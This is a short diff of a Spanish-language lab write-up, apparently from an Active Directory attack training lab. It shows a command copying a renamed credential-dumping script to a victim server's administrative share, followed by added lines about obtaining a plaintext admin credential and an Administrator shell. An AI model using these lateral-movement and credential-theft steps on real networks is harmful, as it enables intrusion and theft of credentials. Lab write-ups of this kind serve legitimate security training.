@@ -580,3 +580,6 @@ Lo volvemos a copiar en la maquina victima y lo ejecutamos
 ```shell
 Copy-Item C:\AD\Tools\Invoke-TheKatEX-vault-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 ```
+
+Obteniendo la credencial del usuario srvadmin en texto plano
+Ahora podemos ejecutar un proceso como srvadmin y obtener una shell como Administrador
